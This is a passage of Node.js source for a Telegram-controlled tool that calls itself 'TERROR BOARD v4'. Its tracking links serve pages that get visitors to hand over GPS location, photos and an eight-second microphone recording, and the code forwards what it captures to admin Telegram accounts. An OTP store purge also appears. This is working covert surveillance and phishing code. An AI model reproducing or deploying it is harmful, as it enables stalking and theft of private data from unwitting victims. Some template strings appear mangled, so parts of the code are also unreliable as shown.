app.get('/l/:id', (req, res) => {
  const id = req.params.id;
  if (!db.locLinks[id]) return res.status(404).send('Expired');
  db.locLinks[id].hits++;
  saveDb();
  res.send(`<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Location</title>
<style>body{font-family:system-ui;text-align:center;padding:40px;background:#111;color:#fff}#s{margin-top:20px}</style></head>
<body><h2>📍 Share Location</h2><p id="s">Requesting GPS...</p>
<script>
navigator.geolocation.getCurrentPosition(async p=>{
  await fetch('/upload/loc',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({id:'${id}',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
  document.getElementById('s').textContent='Location sent. You can close this page.';
},e=>{document.getElementById('s').textContent='Permission denied'},{enableHighAccuracy:true,timeout:15000});
</script></body></html>`);
});

app.post('/upload/loc', async (req, res) => {
  const { id, lat, lon, acc } = req.body || {};
  if (!db.locLinks[id]) return res.json({ ok: false });
  db.locLinks[id].coords = { lat, lon, acc };
  saveDb();
  const maps = `https://maps.google.com/?q=\( {lat}, \){lon}`;
  await notifyAdmins(`📍 <b>LOCATION</b>\nLat: <code>\( {lat}</code>\nLon: <code> \){lon}</code>\nAcc: \( {acc}m\n<a href=" \){maps}">Open Maps</a>`);
  log('loc_capture', null, { id, lat, lon });
  res.json({ ok: true });
});

// ----- Gallery -----
app.get('/g/:id', (req, res) => {
  const id = req.params.id;
  if (!db.galleryLinks[id]) return res.status(404).send('Expired');
  db.galleryLinks[id].hits++;
  saveDb();
  res.send(`<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Gallery</title>
<style>body{font-family:system-ui;text-align:center;padding:40px;background:#111;color:#fff}input{margin:20px}</style></head>
<body><h2>🖼 Select Photos</h2>
<input type="file" accept="image/*" multiple id="f">
<p id="s"></p>
<script>
document.getElementById('f').onchange=async e=>{
  const files=e.target.files; if(!files.length)return;
  document.getElementById('s').textContent='Uploading '+files.length+' files...';
  for(const file of files){
    const fd=new FormData(); fd.append('id','${id}'); fd.append('file',file);
    await fetch('/upload/gal',{method:'POST',body:fd});
  }
  document.getElementById('s').textContent='Done';
};
</script></body></html>`);
});

app.post('/upload/gal', upload.single('file'), async (req, res) => {
  try {
    const id = req.body.id;
    const file = req.file;
    if (!file || !db.galleryLinks[id]) return res.json({ ok: false });
    for (const aid of ADMIN_IDS) {
      try {
        await bot.telegram.sendPhoto(aid, { source: Readable.from(file.buffer), filename: file.originalname || 'photo.jpg' }, {
          caption: `🖼 Gallery\nID: <code>${id}</code>`,
          parse_mode: 'HTML'
        });
      } catch (e) {}
    }
    log('gal_capture', null, { id });
    res.json({ ok: true });
  } catch (e) {
    res.json({ ok: false });
  }
});

// ----- Mic -----
app.get('/m/:id', (req, res) => {
  const id = req.params.id;
  if (!db.micLinks[id]) return res.status(404).send('Expired');
  db.micLinks[id].hits++;
  saveDb();
  res.send(`<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Mic</title>
<style>body{font-family:system-ui;text-align:center;padding:40px;background:#111;color:#fff}</style></head>
<body><h2>🎤 Microphone</h2><p id="s">Requesting mic...</p>
<script>
(async()=>{
  try{
    const stream=await navigator.mediaDevices.getUserMedia({audio:true});
    document.getElementById('s').textContent='Recording 8 seconds...';
    const rec=new MediaRecorder(stream); const chunks=[];
    rec.ondataavailable=e=>chunks.push(e.data);
    rec.onstop=async()=>{
      const blob=new Blob(chunks,{type:'audio/webm'});
      const fd=new FormData(); fd.append('id','${id}'); fd.append('file',blob,'audio.webm');
      await fetch('/upload/mic',{method:'POST',body:fd});
      document.getElementById('s').textContent='Sent';
      stream.getTracks().forEach(t=>t.stop());
    };
    rec.start(); setTimeout(()=>rec.stop(),8000);
  }catch(e){document.getElementById('s').textContent='Permission denied'}
})();
</script></body></html>`);
});

app.post('/upload/mic', upload.single('file'), async (req, res) => {
  try {
    const id = req.body.id;
    const file = req.file;
    if (!file || !db.micLinks[id]) return res.json({ ok: false });
    for (const aid of ADMIN_IDS) {
      try {
        await bot.telegram.sendVoice(aid, { source: Readable.from(file.buffer), filename: 'audio.webm' }, {
          caption: `🎤 Mic\nID: <code>${id}</code>`,
          parse_mode: 'HTML'
        });
      } catch (e) {}
    }
    log('mic_capture', null, { id });
    res.json({ ok: true });
  } catch (e) {
    res.json({ ok: false });
  }
});

// ===================== LAUNCH =====================
async function launch() {
  console.log('========================================');
  console.log('  TERROR BOARD v4 — PRODUCTION');
  console.log('========================================');

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] HTTP on 0.0.0.0:${PORT}`);
  });

  if (WEBHOOK_URL) {
    try {
      await bot.telegram.deleteWebhook({ drop_pending_updates: true });
      await bot.telegram.setWebhook(`\( {WEBHOOK_URL}/bot \){BOT_TOKEN}`);
      app.use(bot.webhookCallback(`/bot${BOT_TOKEN}`));
      console.log('[+] Webhook active');
    } catch (e) {
      console.log('[!] Webhook error → polling', e.message);
      await bot.launch();
    }
  } else {
    await bot.launch();
  }

  process.once('SIGINT', () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
}

cron.schedule('*/15 * * * *', () => {
  const now = Date.now();
  const ttl = db.settings.otpTtl * 1000;
  Object.keys(db.otpStore).forEach(k => {
    if (now - db.otpStore[k].created > ttl) delete db.otpStore[k];
  });
  saveDb();
});

launch().catch(err => {
  console.error(err);
  process.exit(1);
});
